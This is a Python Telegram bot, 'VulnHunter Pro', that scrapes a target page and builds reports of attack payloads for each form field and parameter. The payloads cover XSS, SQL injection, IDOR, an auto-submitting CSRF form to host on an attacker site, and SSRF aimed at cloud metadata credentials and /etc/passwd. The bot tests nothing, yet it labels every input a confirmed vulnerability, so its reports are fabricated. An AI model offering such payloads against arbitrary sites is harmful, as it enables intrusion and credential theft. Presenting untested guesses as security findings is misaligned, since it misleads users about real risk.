"""
VulnHunter Pro - Telegram Bot
AI-Powered Vulnerability Scanner with Professional Reports
"""

import os
import re
import json
import asyncio
import aiohttp
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Bot configuration
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')

class VulnerabilityScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.results = {
            'url': target_url,
            'scan_time': datetime.now().isoformat(),
            'forms': [],
            'params': [],
            'headers': {},
            'technologies': [],
            'vulnerabilities': []
        }
    
    async def fetch_page(self):
        """Fetch target page content"""
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(self.target_url, timeout=30, allow_redirects=True) as response:
                    html = await response.text()
                    self.results['headers'] = dict(response.headers)
                    return html
            except Exception as e:
                raise Exception(f"Failed to fetch page: {str(e)}")
    
    def analyze_forms(self, html):
        """Extract and analyze forms"""
        soup = BeautifulSoup(html, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }
            
            for input_tag in form.find_all(['input', 'textarea']):
                input_data = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text')
                }
                if input_data['name']:
                    form_data['inputs'].append(input_data)
            
            self.results['forms'].append(form_data)
    
    def analyze_parameters(self):
        """Extract URL parameters"""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        for key, values in params.items():
            self.results['params'].append({
                'name': key,
                'value': values[0] if values else '',
                'location': 'query'
            })
    
    def detect_technologies(self, html):
        """Detect web technologies"""
        tech = []
        
        # Check headers
        headers_lower = {k.lower(): v for k, v in self.results['headers'].items()}
        if 'x-powered-by' in headers_lower:
            tech.append(headers_lower['x-powered-by'])
        if 'server' in headers_lower:
            tech.append(headers_lower['server'])
        
        # Check HTML content
        if 'wp-content' in html:
            tech.append('WordPress')
        if 'drupal' in html.lower():
            tech.append('Drupal')
        if 'joomla' in html.lower():
            tech.append('Joomla')
        if 'react' in html.lower():
            tech.append('React')
        if 'angular' in html.lower():
            tech.append('Angular')
        if 'vue' in html.lower():
            tech.append('Vue.js')
        if 'jquery' in html.lower():
            tech.append('jQuery')
        
        self.results['technologies'] = tech if tech else ['Unknown']
    
    def analyze_security_headers(self):
        """Analyze security headers"""
        headers_lower = {k.lower(): v for k, v in self.results['headers'].items()}
        
        security_headers = {
            'X-Frame-Options': headers_lower.get('x-frame-options', 'Missing ⚠️'),
            'X-XSS-Protection': headers_lower.get('x-xss-protection', 'Missing ⚠️'),
            'Content-Security-Policy': headers_lower.get('content-security-policy', 'Missing ⚠️'),
            'Strict-Transport-Security': headers_lower.get('strict-transport-security', 'Missing ⚠️'),
            'X-Content-Type-Options': headers_lower.get('x-content-type-options', 'Missing ⚠️')
        }
        
        self.results['security_headers'] = security_headers
    
    def generate_payloads(self):
        """Generate contextual payloads for vulnerabilities"""
        vulnerabilities = []
        
        # XSS payloads for forms
        for idx, form in enumerate(self.results['forms']):
            for input_field in form['inputs']:
                payloads = [
                    {"payload": "<script>alert('XSS')</script>", "description": "Basic XSS test", "usage": f"Test in {input_field['name']} field"},
                    {"payload": "<img src=x onerror=alert('XSS')>", "description": "Image tag XSS", "usage": "Works when script tags are filtered"},
                    {"payload": "'\"><script>alert(String.fromCharCode(88,83,83))</script>", "description": "Attribute escape + obfuscation", "usage": "Breaks out of attributes"},
                    {"payload": "javascript:alert('XSS')", "description": "JavaScript protocol", "usage": "For href/src attributes"},
                    {"payload": "<svg onload=alert('XSS')>", "description": "SVG-based XSS", "usage": "When CSP is weak"},
                ]
                
                vulnerabilities.append({
                    'type': 'XSS',
                    'severity': 'High',
                    'location': f"Form {idx + 1} - Input: {input_field['name']}",
                    'payloads': payloads,
                    'endpoint': form['action'] or self.target_url,
                    'method': form['method']
                })
        
        # SQL Injection payloads
        all_inputs = self.results['params'] + [inp for form in self.results['forms'] for inp in form['inputs']]
        for param in all_inputs:
            payloads = [
                {"payload": "' OR '1'='1", "description": "Basic authentication bypass", "usage": "Test for SQL injection"},
                {"payload": "' OR 1=1--", "description": "Comment-based bypass", "usage": "Works with -- comment syntax"},
                {"payload": "admin' --", "description": "Username bypass", "usage": "For login forms"},
                {"payload": "' UNION SELECT NULL,NULL,NULL--", "description": "Union-based extraction", "usage": "Enumerate columns"},
                {"payload": "' AND SLEEP(5)--", "description": "Time-based blind SQLi", "usage": "When no output visible"},
                {"payload": "1' ORDER BY 1--", "description": "Column enumeration", "usage": "Find number of columns"},
            ]
            
            vulnerabilities.append({
                'type': 'SQLi',
                'severity': 'Critical',
                'location': f"Parameter: {param['name']}",
                'payloads': payloads,
                'endpoint': self.target_url,
                'method': 'GET/POST'
            })
        
        # IDOR payloads
        for param in self.results['params']:
            if re.search(r'id|user|account|profile', param['name'], re.IGNORECASE):
                value = param.get('value', '1')
                try:
                    int_value = int(value)
                    payloads = [
                        {"payload": f"{param['name']}={int_value + 1}", "description": "Sequential ID manipulation", "usage": "Access next user's data"},
                        {"payload": f"{param['name']}={int_value - 1}", "description": "Previous ID access", "usage": "Access previous user's data"},
                        {"payload": f"{param['name']}=0", "description": "Zero ID test", "usage": "Check for admin/system account"},
                        {"payload": f"{param['name']}=999999", "description": "High ID test", "usage": "Test boundary conditions"},
                    ]
                    
                    vulnerabilities.append({
                        'type': 'IDOR',
                        'severity': 'Medium',
                        'location': f"Parameter: {param['name']}",
                        'payloads': payloads,
                        'endpoint': self.target_url,
                        'method': 'GET'
                    })
                except:
                    pass
        
        # CSRF checks
        for idx, form in enumerate(self.results['forms']):
            has_csrf = any(re.search(r'csrf|token|_token', inp['name'], re.IGNORECASE) for inp in form['inputs'])
            if not has_csrf and form['method'] == 'POST':
                form_html = f"<form action='{form['action'] or self.target_url}' method='{form['method']}'>\n"
                for inp in form['inputs']:
                    form_html += f"  <input type='{inp['type']}' name='{inp['name']}' value='malicious'>\n"
                form_html += "  <input type='submit' value='Submit'>\n</form>\n<script>document.forms[0].submit();</script>"
                
                payloads = [
                    {"payload": form_html, "description": "Auto-submitting CSRF PoC", "usage": "Host on attacker site"},
                ]
                
                vulnerabilities.append({
                    'type': 'CSRF',
                    'severity': 'Medium',
                    'location': f"Form {idx + 1}",
                    'payloads': payloads,
                    'endpoint': form['action'] or self.target_url,
                    'method': 'POST'
                })
        
        # SSRF checks
        for param in self.results['params']:
            if re.search(r'url|uri|path|redirect|callback|link', param['name'], re.IGNORECASE):
                payloads = [
                    {"payload": f"{param['name']}=http://localhost/admin", "description": "Local service access", "usage": "Access internal services"},
                    {"payload": f"{param['name']}=http://169.254.169.254/latest/meta-data/", "description": "AWS metadata access", "usage": "Extract cloud credentials"},
                    {"payload": f"{param['name']}=file:///etc/passwd", "description": "Local file read", "usage": "Read sensitive files"},
                    {"payload": f"{param['name']}=http://127.0.0.1:6379/", "description": "Redis access", "usage": "Target internal Redis"},
                ]
                
                vulnerabilities.append({
                    'type': 'SSRF',
                    'severity': 'High',
                    'location': f"Parameter: {param['name']}",
                    'payloads': payloads,
                    'endpoint': self.target_url,
                    'method': 'GET'
                })
        
        self.results['vulnerabilities'] = vulnerabilities
        self.results['total_vulns'] = len(vulnerabilities)
    
    async def scan(self):
        """Run complete scan"""
        html = await self.fetch_page()
        self.analyze_forms(html)
        self.analyze_parameters()
        self.detect_technologies(html)
        self.analyze_security_headers()
        self.generate_payloads()
        
        return self.results


class ReportGenerator:
    @staticmethod
    def escape_html(text):
        """Escape HTML special characters"""
        return (text.replace('&', '&amp;')
                   .replace('<', '&lt;')
                   .replace('>', '&gt;')
                   .replace('"', '&quot;')
                   .replace("'", '&#039;'))
    
    @staticmethod
    def generate_text_report(results):
        """Generate professional text report"""
        report = f"""
╔═══════════════════════════════════════════════════════════╗
║           VulnHunter Pro - Security Report                ║
╚═══════════════════════════════════════════════════════════╝

🎯 TARGET INFORMATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
URL: {results['url']}
Scan Time: {datetime.fromisoformat(results['scan_time']).strftime('%Y-%m-%d %H:%M:%S')}
Technologies: {', '.join(results['technologies'])}
Forms Found: {len(results['forms'])}
Parameters: {len(results['params'])}

📊 VULNERABILITY SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Total Vulnerabilities: {results['total_vulns']}
Critical: {len([v for v in results['vulnerabilities'] if v['severity'] == 'Critical'])}
High: {len([v for v in results['vulnerabilities'] if v['severity'] == 'High'])}
Medium: {len([v for v in results['vulnerabilities'] if v['severity'] == 'Medium'])}

🛡️ SECURITY HEADERS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        for header, value in results.get('security_headers', {}).items():
            report += f"{header}: {value}\n"
        
        report += "\n🔥 VULNERABILITY DETAILS\n"
        report += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        for idx, vuln in enumerate(results['vulnerabilities'], 1):
            report += f"{idx}. {vuln['type']} [{vuln['severity']}]\n"
            report += f"   Location: {vuln['location']}\n"
            report += f"   Endpoint: {vuln['endpoint']}\n"
            report += f"   Method: {vuln['method']}\n\n"
            report += "   ⚡ Payloads:\n"
            for pidx, payload in enumerate(vuln['payloads'][:3], 1):  # Limit to 3 for text report
                report += f"   {pidx}. {payload['description']}\n"
                report += f"      Payload: {payload['payload'][:100]}...\n"
                report += f"      Usage: {payload['usage']}\n\n"
            report += "\n"
        
        report += """
⚠️ DISCLAIMER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
This report is for authorized security testing only.
Ensure you have written permission before testing any system.
Unauthorized access is illegal and unethical.

Generated by VulnHunter Pro | https://github.com/yourusername/vulnhunter-pro
"""
        return report
    
    @staticmethod
    def generate_html_report(results):
        """Generate Halloween-themed HTML report"""
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VulnHunter Pro - Security Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0000 100%);
            color: #ff0000;
            padding: 20px;
        }}
        .container {{ max-width: 1400px; margin: 0 auto; }}
        .header {{
            text-align: center;
            padding: 40px;
            border: 3px solid #ff0000;
            background: rgba(0, 0, 0, 0.9);
            margin-bottom: 30px;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
        }}
        .skull {{ font-size: 80px; animation: pulse 2s infinite; }}
        @keyframes pulse {{
            0%, 100% {{ text-shadow: 0 0 20px #ff0000; }}
            50% {{ text-shadow: 0 0 40px #ff0000; transform: scale(1.05); }}
        }}
        h1 {{
            font-size: 48px;
            text-shadow: 0 0 20px #ff0000;
            margin: 20px 0;
        }}
        .stats {{
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }}
        .stat-card {{
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid #ff0000;
            padding: 30px;
            text-align: center;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
        }}
        .stat-number {{
            font-size: 48px;
            font-weight: bold;
            color: #ff0000;
            text-shadow: 0 0 20px #ff0000;
        }}
        .vuln-section {{
            background: rgba(0, 0, 0, 0.9);
            border: 3px solid #ff0000;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.4);
        }}
        .vuln-header {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid #ff0000;
        }}
        .severity {{
            padding: 8px 16px;
            border: 2px solid #ff0000;
            font-weight: bold;
            background: rgba(255, 0, 0, 0.2);
        }}
        .severity.critical {{ background: rgba(139, 0, 0, 0.5); }}
        .payload-item {{
            background: rgba(20, 0, 0, 0.8);
            border-left: 4px solid #ff0000;
            padding: 15px;
            margin: 15px 0;
        }}
        .payload-code {{
            background: #000;
            color: #00ff00;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ff0000;
            overflow-x: auto;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="skull">💀</div>
            <h1>VulnHunter Pro</h1>
            <p>Professional Security Assessment Report</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">{results['total_vulns']}</div>
                <div>Total Vulnerabilities</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{len([v for v in results['vulnerabilities'] if v['severity'] == 'Critical'])}</div>
                <div>Critical</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{len([v for v in results['vulnerabilities'] if v['severity'] == 'High'])}</div>
                <div>High</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{len([v for v in results['vulnerabilities'] if v['severity'] == 'Medium'])}</div>
                <div>Medium</div>
            </div>
        </div>
"""
        
        for idx, vuln in enumerate(results['vulnerabilities'], 1):
            html += f"""
        <div class="vuln-section">
            <div class="vuln-header">
                <div><h2>{idx}. {vuln['type']}</h2></div>
                <div class="severity {vuln['severity'].lower()}">{vuln['severity']}</div>
            </div>
            <p><strong>Location:</strong> {vuln['location']}</p>
            <p><strong>Endpoint:</strong> {vuln['endpoint']}</p>
            <p><strong>Method:</strong> {vuln['method']}</p>
            <h3 style="margin-top: 20px;">⚡ Contextual Payloads</h3>
"""
            for pidx, payload in enumerate(vuln['payloads'], 1):
                html += f"""
            <div class="payload-item">
                <strong>Payload {pidx}: {payload['description']}</strong>
                <div class="payload-code">{ReportGenerator.escape_html(payload['payload'])}</div>
                <p>💡 {payload['usage']}</p>
            </div>
"""
            html += "</div>"
        
        html += """
        <div class="vuln-section" style="text-align: center;">
            <h3>⚠️ DISCLAIMER ⚠️</h3>
            <p>This report is for authorized security testing only.</p>
            <p>Generated by VulnHunter Pro</p>
        </div>
    </div>
</body>
</html>"""
        return html


# Telegram Bot Handlers
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    welcome_text = """
🕷️ **VulnHunter Pro** - AI Vulnerability Scanner

Welcome! I can help you find security vulnerabilities in web applications.

**Commands:**
/scan <url> - Scan a target URL
/help - Show help information

**Example:**
/scan https://example.com

⚠️ **Important:** Only scan systems you have permission to test!
"""
    await update.message.reply_text(welcome_text, parse_mode='Markdown')


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    help_text = """
📚 **VulnHunter Pro Help**

**Available Commands:**
• /start - Start the bot
• /scan <url> - Scan a website for vulnerabilities
• /help - Show this help message

**What I can detect:**
✅ XSS (Cross-Site Scripting)
✅ SQL Injection
✅ IDOR (Insecure Direct Object Reference)
✅ CSRF (Cross-Site Request Forgery)
✅ SSRF (Server-Side Request Forgery)
✅ Security Headers Missing
✅ Technology Detection

**Report Formats:**
📄 Professional Text Report
🎃 Halloween-themed HTML Report

**Legal Notice:**
Only use this tool on systems you have explicit permission to test. Unauthorized security testing is illegal.
"""
    await update.message.reply_text(help_text, parse_mode='Markdown')


async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /scan command"""
    if not context.args:
        await update.message.reply_text("⚠️ Please provide a URL to scan.\n\nExample: /scan https://example.com")
        return
    
    target_url = context.args[0]
    
    # Validate URL
    if not target_url.startswith(('http://', 'https://')):
        await update.message.reply_text("❌ Invalid URL. Please include http:// or https://")
        return
    
    # Send scanning message
    status_msg = await update.message.reply_text(
        f"🔍 **Scanning:** {target_url}\n\n"
        "⏳ Please wait... This may take 30-60 seconds.\n\n"
        "Progress:\n"
        "▪️ Fetching page...",
        parse_mode='Markdown'
    )
    
    try:
        # Run scan
        scanner = VulnerabilityScanner(target_url)
        
        await status_msg.edit_text(
            f"🔍 **Scanning:** {target_url}\n\n"
            "Progress:\n"
            "✅ Page fetched\n"
            "▪️ Analyzing forms...",
            parse_mode='Markdown'
        )
        
        results = await scanner.scan()
        
        await status_msg.edit_text(
            f"🔍 **Scanning:** {target_url}\n\n"
            "Progress:\n"
            "✅ Page fetched\n"
            "✅ Forms analyzed\n"
            "✅ Generating payloads\n"
            "▪️ Creating reports...",
            parse_mode='Markdown'
        )
        
        # Generate reports
        text_report = ReportGenerator.generate_text_report(results)
        html_report = ReportGenerator.generate_html_report(results)
        
        # Save reports
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        text_filename = f"vulnhunter_report_{timestamp}.txt"
        html_filename = f"vulnhunter_report_{timestamp}.html"
        
        with open(text_filename, 'w', encoding='utf-8') as f:
            f.write(text_report)
        
        with open(html_filename, 'w', encoding='utf-8') as f:
            f.write(html_report)
        
        # Send summary
        summary = f"""
✅ **Scan Complete!**

📊 **Summary:**
• Total Vulnerabilities: {results['total_vulns']}
• Critical: {len([v for v in results['vulnerabilities'] if v['severity'] == 'Critical'])}
• High: {len([v for v in results['vulnerabilities'] if v['severity'] == 'High'])}
• Medium: {len([v for v in results['vulnerabilities'] if v['severity'] == 'Medium'])}

📄 Reports are being sent...
"""
        await status_msg.edit_text(summary, parse_mode='Markdown')
        
        # Send reports as files
        with open(text_filename, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=text_filename,
                caption="📄 Professional Text Report"
            )
        
        with open(html_filename, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=html_filename,
                caption="🎃 Halloween-themed HTML Report"
            )
        
        # Cleanup
        os.remove(text_filename)
        os.remove(html_filename)
        
    except Exception as e:
        await status_msg.edit_text(
            f"❌ **Scan Failed**\n\n"
            f"Error: {str(e)}\n\n"
            "Please check:\n"
            "• URL is accessible\n"
            "• Website allows scanning\n"
            "• No network issues",
            parse_mode='Markdown'
        )


def main():
    """Start the bot"""
    print("🚀 Starting VulnHunter Pro Telegram Bot...")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("scan", scan_command))
    
    # Start bot
    print("✅ Bot is running! Press Ctrl+C to stop.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
